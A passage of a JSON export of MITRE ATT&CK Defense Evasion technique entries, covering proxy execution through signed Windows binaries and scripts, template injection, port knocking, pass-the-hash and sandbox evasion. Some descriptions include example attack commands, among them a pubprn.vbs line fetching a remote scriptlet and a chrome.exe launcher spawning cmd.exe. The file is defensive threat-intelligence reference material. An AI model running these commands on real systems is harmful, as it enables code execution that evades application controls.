Address\" snap-in that is linked to the malicious CLSID subkey.[7]Once the .msc file is saved, adversaries may invoke the malicious CLSID payload with the following command:mmc.exe -Embedding C:\\path\\to\\test.msc.[8]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "System Binary Proxy Execution",
    "parent_technique_id": "T1218",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:13:11.505199"
  },
  {
    "technique_id": "T1218.015",
    "name": "Electron Applications",
    "description": "Adversaries may abuse components of the Electron framework to execute malicious code. The Electron framework hosts many common applications such as Signal, Slack, and Microsoft Teams.[1]Originally developed by GitHub, Electron is a cross-platform desktop application development framework that employs web technologies like JavaScript, HTML, and CSS.[2]The Chromium engine is used to display web content and Node.js runs the backend code.[3]Due to the functional mechanics of Electron (such as allowing apps to run arbitrary commands), adversaries may also be able to perform malicious functions in the background potentially disguised as legitimate tools within the framework.[3]For example, the abuse ofteams.exeandchrome.exemay allow adversaries to execute malicious commands as child processes of the legitimate application (e.g.,chrome.exe --disable-gpu-sandbox --gpu-launcher=\"C:\\Windows\\system32\\cmd.exe /c calc.exe).[4]Adversaries may also execute malicious content by planting maliciousJavaScriptwithin Electron applications.[5]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "System Binary Proxy Execution",
    "parent_technique_id": "T1218",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:13:14.815382"
  },
  {
    "technique_id": "T1216",
    "name": "System Script Proxy Execution",
    "description": "Adversaries may use trusted scripts, often signed with certificates, to proxy the execution of malicious files. Several Microsoft signed scripts that have been downloaded from Microsoft or are default on Windows installations can be used to proxy execution of other files.[1]This behavior may be abused by adversaries to execute malicious files that could bypass application control and signature validation on systems.[2]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:13:18.128568",
    "subtechniques": [
      {
        "id": "T1216.001",
        "name": "PubPrn"
      },
      {
        "id": "T1216.002",
        "name": "SyncAppvPublishingServer"
      }
    ]
  },
  {
    "technique_id": "T1216.001",
    "name": "PubPrn",
    "description": "Adversaries may use PubPrn to proxy execution of malicious remote files. PubPrn.vbs is aVisual Basicscript that publishes a printer to Active Directory Domain Services. The script may be signed by Microsoft and is commonly executed through theWindows Command ShellviaCscript.exe. For example, the following code publishes a printer within the specified domain:cscript pubprn Printer1 LDAP://CN=Container1,DC=Domain1,DC=Com.[1]Adversaries may abuse PubPrn to execute malicious payloads hosted on remote sites.[2]To do so, adversaries may set the secondscript:parameter to reference a scriptlet file (.sct) hosted on a remote site. An example command ispubprn.vbs 127.0.0.1 script:https://mydomain.com/folder/file.sct. This behavior may bypass signature validation restrictions and application control solutions that do not account for abuse of this script.In later versions of Windows (10+),PubPrn.vbshas been updated to prevent proxying execution from a remote site. This is done by limiting the protocol specified in the second parameter toLDAP://, vice thescript:moniker which could be used to reference remote code via HTTP(S).",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "System Script Proxy Execution",
    "parent_technique_id": "T1216",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:13:21.464251"
  },
  {
    "technique_id": "T1216.002",
    "name": "SyncAppvPublishingServer",
    "description": "Adversaries may abuse SyncAppvPublishingServer.vbs to proxy execution of maliciousPowerShellcommands. SyncAppvPublishingServer.vbs is a Visual Basic script associated with how Windows virtualizes applications (Microsoft Application Virtualization, or App-V).[1]For example, Windows may render Win32 applications to users as virtual applications, allowing users to launch and interact with them as if they were installed locally.[2][3]The SyncAppvPublishingServer.vbs script is legitimate, may be signed by Microsoft, and is commonly executed from\\System32through the command line viawscript.exe.[4][5]Adversaries may abuse SyncAppvPublishingServer.vbs to bypassPowerShellexecution restrictions and evade defensive counter measures by \"living off the land.\"[6][4]Proxying execution may function as a trusted/signed alternative to directly invokingpowershell.exe.[7]For example,PowerShellcommands may be invoked using:[5]SyncAppvPublishingServer.vbs \"n; {PowerShell}\"",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "System Script Proxy Execution",
    "parent_technique_id": "T1216",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:13:24.806273"
  },
  {
    "technique_id": "T1221",
    "name": "Template Injection",
    "description": "Adversaries may create or modify references in user document templates to conceal malicious code or force authentication attempts. For example, Microsoftâ€™s Office Open XML (OOXML) specification defines an XML-based format for Office documents (.docx, xlsx, .pptx) to replace older binary formats (.doc, .xls, .ppt). OOXML files are packed together ZIP archives compromised of various XML files, referred to as parts, containing properties that collectively define how a document is rendered.[1]Properties within parts may reference shared public resources accessed via online URLs. For example, template properties may reference a file, serving as a pre-formatted document blueprint, that is fetched when the document is loaded.Adversaries may abuse these templates to initially conceal malicious code to be executed via user documents. Template references injected into a document may enable malicious payloads to be fetched and executed when the document is loaded.[2]These documents can be delivered via other techniques such asPhishingand/orTaint Shared Contentand may evade static detections since no typical indicators (VBA macro, script, etc.) are present until after the malicious payload is fetched.[3]Examples have been seen in the wild where template injection was used to load malicious code containing an exploit.[4]Adversaries may also modify the*\\templatecontrol word within an .rtf file to similarly conceal then download malicious code. This legitimate control word value is intended to be a file destination of a template file resource that is retrieved and loaded when an .rtf file is opened. However, adversaries may alter the bytes of an existing .rtf file to insert a template control word field to include a URL resource of a malicious payload.[5][6]This technique may also enableForced Authenticationby injecting a SMB/HTTPS (or other credential prompting) URL and triggering an authentication attempt.[7][8][9]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:13:28.141477",
    "subtechniques": []
  },
  {
    "technique_id": "T1205",
    "name": "Traffic Signaling",
    "description": "Adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control. Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task. This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e.Port Knocking), but can involve unusual flags, specific strings, or other unique characteristics. After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software.Adversaries may also communicate with an already open port, but the service listening on that port will only respond to commands or trigger other malicious functionality if passed the appropriate magic value(s).The observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r[1], is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.On network devices, adversaries may use crafted packets to enableNetwork Device Authenticationfor standard services offered by the device such as telnet.  Such signaling may also be used to open a closed service port such as telnet, or to trigger module modification of malware implants on the device, adding, removing, or changing malicious capabilities.  Adversaries may use crafted packets to attempt to connect to one or more (open or closed) ports, but may also attempt to connect to a router interface, broadcast, and network address IP on the same port in order to achieve their goals and objectives.[2][3][4]To enable this traffic signaling on embedded devices, adversaries must first achieve and leveragePatch System Imagedue to the monolithic nature of the architecture.Adversaries may also use the Wake-on-LAN feature to turn on powered off systems. Wake-on-LAN is a hardware feature that allows a powered down system to be powered on, or woken up, by sending a magic packet to it. Once the system is powered on, it may become a target for lateral movement.[5][6]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:13:31.457924",
    "subtechniques": [
      {
        "id": "T1205.001",
        "name": "Port Knocking"
      },
      {
        "id": "T1205.002",
        "name": "Socket Filters"
      }
    ]
  },
  {
    "technique_id": "T1205.001",
    "name": "Port Knocking",
    "description": "Adversaries may use port knocking to hide open ports used for persistence or command and control. To enable a port, an adversary sends a series of attempted connections to a predefined sequence of closed ports. After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.This technique has been observed both for the dynamic opening of a listening port as well as the initiating of a connection to a listening server on a different system.The observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r[1], is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Traffic Signaling",
    "parent_technique_id": "T1205",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:13:34.796724"
  },
  {
    "technique_id": "T1205.002",
    "name": "Socket Filters",
    "description": "Adversaries may attach filters to a network socket to monitor then activate backdoors used for persistence or command and control. With elevated permissions, adversaries can use features such as thelibpcaplibrary to open sockets and install filters to allow or disallow certain types of data to come through the socket. The filter may apply to all traffic passing through the specified network interface (or every interface if not specified). When the network interface receives a packet matching the filter criteria, additional actions can be triggered on the host, such as activation of a reverse shell.To establish a connection, an adversary sends a crafted packet to the targeted host that matches the installed filter criteria.[1]Adversaries have used these socket filters to trigger the installation of implants, conduct ping backs, and to invoke command shells. Communication with these socket filters may also be used in conjunction withProtocol Tunneling.[2][3]Filters can be installed on any Unix-like platform withlibpcapinstalled or on Windows hosts usingWinpcap.  Adversaries may use eitherlibpcapwithpcap_setfilteror the standard library functionsetsockoptwithSO_ATTACH_FILTERoptions. Since the socket connection is not active until the packet is received, this behavior may be difficult to detect due to the lack of activity on a host, low CPU overhead, and limited visibility into raw socket usage.",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Traffic Signaling",
    "parent_technique_id": "T1205",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:13:38.194831"
  },
  {
    "technique_id": "T1127",
    "name": "Trusted Developer Utilities Proxy Execution",
    "description": "Adversaries may take advantage of trusted developer utilities to proxy execution of malicious payloads. There are many utilities used for software development related tasks that can be used to execute code in various forms to assist in development, debugging, and reverse engineering.[1][2][3][4]These utilities may often be signed with legitimate certificates that allow them to execute on a system and proxy execution of malicious code through a trusted process that effectively bypasses application control solutions.Smart App Control is a feature of Windows that blocks applications it considers potentially malicious from running by verifying unsigned applications against a known safe list from a Microsoft cloud service before executing them.[5]However, adversaries may leverage \"reputation hijacking\" to abuse an operating systemâ€™s trust of safe, signed applications that support the execution of arbitrary code. By leveragingTrusted Developer Utilities Proxy Executionto run their malicious code, adversaries may bypass Smart App Control protections.[6]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:13:41.621819",
    "subtechniques": [
      {
        "id": "T1127.001",
        "name": "MSBuild"
      },
      {
        "id": "T1127.002",
        "name": "ClickOnce"
      },
      {
        "id": "T1127.003",
        "name": "JamPlus"
      }
    ]
  },
  {
    "technique_id": "T1127.001",
    "name": "MSBuild",
    "description": "Adversaries may use MSBuild to proxy execution of code through a trusted Windows utility. MSBuild.exe (Microsoft Build Engine) is a software build platform used by Visual Studio. It handles XML formatted project files that define requirements for loading and building various platforms and configurations.[1]Adversaries can abuse MSBuild to proxy execution of malicious code. The inline task capability of MSBuild that was introduced in .NET version 4 allows for C# or Visual Basic code to be inserted into an XML project file.[1][2]MSBuild will compile and execute the inline task. MSBuild.exe is a signed Microsoft binary, so when it is used this way it can execute arbitrary code and bypass application control defenses that are configured to allow MSBuild.exe execution.[3]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Trusted Developer Utilities Proxy Execution",
    "parent_technique_id": "T1127",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:13:44.983051"
  },
  {
    "technique_id": "T1127.002",
    "name": "ClickOnce",
    "description": "Adversaries may use ClickOnce applications (.appref-ms and .application files) to proxy execution of code through a trusted Windows utility.[1]ClickOnce is a deployment that enables a user to create self-updating Windows-based .NET applications (i.e, .XBAP, .EXE, or .DLL) that install and run from a file share or web page with minimal user interaction. The application launches as a child process of DFSVC.EXE, which is responsible for installing, launching, and updating the application.[2]Because ClickOnce applications receive only limited permissions, they do not require administrative permissions to install.[3]As such, adversaries may abuse ClickOnce to proxy execution of malicious code without needing to escalate privileges.ClickOnce may be abused in a number of ways. For example, an adversary may rely onUser Execution. When a user visits a malicious website, the .NET malware is disguised as legitimate software and a ClickOnce popup is displayed for installation.[4]Adversaries may also abuse ClickOnce to execute malware via aRundll32script using the commandrundll32.exe dfshim.dll,ShOpenVerbApplication1.[5]Additionally, an adversary can move the ClickOnce application file to a remote userâ€™s startup folder for continued malicious code deployment (i.e.,Registry Run Keys / Startup Folder).[1][6]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Trusted Developer Utilities Proxy Execution",
    "parent_technique_id": "T1127",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:13:48.241613"
  },
  {
    "technique_id": "T1127.003",
    "name": "JamPlus",
    "description": "Adversaries may useJamPlusto proxy the execution of a malicious script.JamPlusis a build utility tool for code and data build systems. It works with several popular compilers and can be used for generating workspaces in code editors such as Visual Studio.[1]Adversaries may abuse theJamPlusbuild utility to execute malicious scripts via a.jamfile, which describes the build process and required dependencies. Because the malicious script is executed from a reputable developer tool, it may subvert application control security systems such as Smart App Control.[2][3]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Trusted Developer Utilities Proxy Execution",
    "parent_technique_id": "T1127",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:13:51.570851"
  },
  {
    "technique_id": "T1550",
    "name": "Use Alternate Authentication Material",
    "description": "Adversaries may use alternate authentication material, such as password hashes, Kerberos tickets, and application access tokens, in order to move laterally within an environment and bypass normal system access controls.Authentication processes generally require a valid identity (e.g., username) along with one or more authentication factors (e.g., password, pin, physical smart card, token generator, etc.). Alternate authentication material is legitimately generated by systems after a user or application successfully authenticates by providing a valid identity and the required authentication factor(s). Alternate authentication material may also be generated during the identity creation process.[1][2]Caching alternate authentication material allows the system to verify an identity has successfully authenticated without asking the user to reenter authentication factor(s). Because the alternate authentication must be maintained by the systemâ€”either in memory or on diskâ€”it may be at risk of being stolen throughCredential Accesstechniques. By stealing alternate authentication material, adversaries are able to bypass system access controls and authenticate to systems without knowing the plaintext password or any additional authentication factors.",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:13:54.922587",
    "subtechniques": [
      {
        "id": "T1550.002",
        "name": "Pass the Hash"
      },
      {
        "id": "T1550.003",
        "name": "Pass the Ticket"
      }
    ]
  },
  {
    "technique_id": "T1550.002",
    "name": "Pass the Hash",
    "description": "Adversaries may \"pass the hash\" using stolen password hashes to move laterally within an environment, bypassing normal system access controls. Pass the hash (PtH) is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash.When performing PtH, valid password hashes for the account being used are captured using aCredential Accesstechnique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems.Adversaries may also use stolen password hashes to \"overpass the hash.\" Similar to PtH, this involves using a password hash to authenticate as a user but also uses the password hash to create a valid Kerberos ticket. This ticket can then be used to performPass the Ticketattacks.[1]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Use Alternate Authentication Material",
    "parent_technique_id": "T1550",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:13:58.261419"
  },
  {
    "technique_id": "T1550.003",
    "name": "Pass the Ticket",
    "description": "Adversaries may \"pass the ticket\" using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls. Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system.When preforming PtT, valid Kerberos tickets forValid Accountsare captured byOS Credential Dumping. A user's service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access.[1][2]ASilver Ticketcan be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint).[1]AGolden Ticketcan be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory.[3]Adversaries may also create a valid Kerberos ticket using other user information, such as stolen password hashes or AES keys. For example, \"overpassing the hash\" involves using a NTLM password hash to authenticate as a user (i.e.Pass the Hash) while also using the password hash to create a valid Kerberos ticket.[4]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Use Alternate Authentication Material",
    "parent_technique_id": "T1550",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:14:01.638647"
  },
  {
    "technique_id": "T1078",
    "name": "Valid Accounts",
    "description": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.[1]Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.In some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.[2]The overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.[3]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:14:05.062517",
    "subtechniques": [
      {
        "id": "T1078.001",
        "name": "Default Accounts"
      },
      {
        "id": "T1078.002",
        "name": "Domain Accounts"
      },
      {
        "id": "T1078.003",
        "name": "Local Accounts"
      }
    ]
  },
  {
    "technique_id": "T1078.001",
    "name": "Default Accounts",
    "description": "Adversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems. Default accounts also include default factory/provider set accounts on other types of systems, software, or devices, including the root user account in AWS, the root user account in ESXi, and the default service account in Kubernetes.[1][2][3]Default accounts are not limited to client machines; rather, they also include accounts that are preset for equipment such as network devices and computer applications, whether they are internal, open source, or commercial. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed or stolenPrivate Keysor credential materials to legitimately connect to remote environments viaRemote Services.[4]Default accounts may be created on a system after initial setup by connecting or integrating it with another application. For example, when an ESXi server is connected to a vCenter server, a default privileged account calledvpxuseris created on the ESXi server. If a threat actor is able to compromise this accountâ€™s credentials (for example, viaExploitation for Credential Accesson the vCenter host), they will then have access to the ESXi server.[5][6]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Valid Accounts",
    "parent_technique_id": "T1078",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:14:08.308509"
  },
  {
    "technique_id": "T1078.002",
    "name": "Domain Accounts",
    "description": "Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.[1]Domain accounts are those managed by Active Directory Domain Services where access and permissions are configured across systems and services that are part of that domain. Domain accounts can cover users, administrators, and services.[2]Adversaries may compromise domain accounts, some with a high level of privileges, through various means such asOS Credential Dumpingor password reuse, allowing access to privileged resources of the domain.",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Valid Accounts",
    "parent_technique_id": "T1078",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:14:11.595697"
  },
  {
    "technique_id": "T1078.003",
    "name": "Local Accounts",
    "description": "Adversaries may obtain and abuse credentials of a local account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service.Local Accounts may also be abused to elevate privileges and harvest credentials throughOS Credential Dumping. Password reuse may allow the abuse of local accounts across a set of machines on a network for the purposes of Privilege Escalation and Lateral Movement.",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Valid Accounts",
    "parent_technique_id": "T1078",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:14:14.940109"
  },
  {
    "technique_id": "T1497",
    "name": "Virtualization/Sandbox Evasion",
    "description": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned fromVirtualization/Sandbox Evasionduring automated discovery to shape follow-on behaviors.[1]Adversaries may use several methods to accomplishVirtualization/Sandbox Evasionsuch as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.[2]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": false,
    "parent_technique": "",
    "parent_technique_id": "",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:14:18.294914",
    "subtechniques": [
      {
        "id": "T1497.001",
        "name": "System Checks"
      },
      {
        "id": "T1497.002",
        "name": "User Activity Based Checks"
      },
      {
        "id": "T1497.003",
        "name": "Time Based Evasion"
      }
    ]
  },
  {
    "technique_id": "T1497.001",
    "name": "System Checks",
    "description": "Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned fromVirtualization/Sandbox Evasionduring automated discovery to shape follow-on behaviors.[1]Specific checks will vary based on the target and/or adversary, but may involve behaviors such asWindows Management Instrumentation,PowerShell,System Information Discovery, andQuery Registryto obtain system information and search for VME artifacts. Adversaries may search for VME artifacts in memory, processes, file system, hardware, and/or the Registry. Adversaries may use scripting to automate these checks  into one script and then have the program exit if it determines the system to be a virtual environment.Checks could include generic system properties such as host/domain name and samples of network traffic. Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size. Once executed, malware may also useFile and Directory Discoveryto check if it was saved in a folder or file with unexpected or even analysis-related naming artifacts such asmalware,sample, orhash.Other common checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer/product fields for strings relating to virtual machine applications, and VME-specific hardware/processor instructions.[2]In applications like VMWare, adversaries can also use a special I/O port to send commands and receive output.Hardware checks, such as the presence of the fan, temperature, and audio devices, could also be used to gather evidence that can be indicative a virtual environment. Adversaries may also query for specific readings from these devices.[3]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Virtualization/Sandbox Evasion",
    "parent_technique_id": "T1497",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:14:21.668586"
  },
  {
    "technique_id": "T1497.002",
    "name": "User Activity Based Checks",
    "description": "Adversaries may employ various user activity checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned fromVirtualization/Sandbox Evasionduring automated discovery to shape follow-on behaviors.[1]Adversaries may search for user activity on the host based on variables such as the speed/frequency of mouse movements and clicks[2], browser history, cache, bookmarks, or number of files in common directories such as home or the desktop. Other methods may rely on specific user interaction with the system before the malicious code is activated, such as waiting for a document to close before activating a macro[3]or waiting for a user to double click on an embedded image to activate.[4]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Virtualization/Sandbox Evasion",
    "parent_technique_id": "T1497",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:14:25.003912"
  },
  {
    "technique_id": "T1497.003",
    "name": "Time Based Evasion",
    "description": "Adversaries may employ various time-based methods to detect and avoid virtualization and analysis environments. This may include enumerating time-based properties, such as uptime or the system clock, as well as the use of timers or other triggers to avoid a virtual machine environment (VME) or sandbox, specifically those that are automated or only operate for a limited amount of time.Adversaries may employ various time-based evasions, such as delaying malware functionality upon initial execution using programmatic sleep commands or native system scheduling functionality (ex:Scheduled Task/Job). Delays may also be based on waiting for specific victim conditions to be met (ex: system time, events, etc.) or employ scheduledMulti-Stage Channelsto avoid analysis and scrutiny.[1]Benign commands or other operations may also be used to delay malware execution. Loops or otherwise needless repetitions of commands, such asPings, may be used to delay malware execution and potentially exceed time thresholds of automated analysis environments.[2][3]Another variation, commonly referred to as API hammering, involves making various calls toNative APIfunctions in order to delay execution (while also potentially overloading analysis environments with junk data).[4][5]Adversaries may also use time as a metric to detect sandboxes and analysis environments, particularly those that attempt to manipulate time mechanisms to simulate longer elapses of time. For example, an adversary may be able to identify a sandbox accelerating time by sampling and calculating the expected value for an environment's timestamp before and after execution of a sleep function.[6]",
    "tactic": "Defense Evasion",
    "tactics": [
      "Defense Evasion"
    ],
    "platforms": [
      "Windows"
    ],
    "data_sources": [],
    "is_subtechnique": true,
    "parent_technique": "Virtualization/Sandbox Evasion",
    "parent_technique_id": "T1497",
    "mitre_version": "1.0",
    "sync_source": "mitre_extractor_enhanced",
    "last_updated": "2025-07-02T13:14:28.369331"
  },
  {
    "technique_id": "T1220",
    "name": "XSL Script Processing",
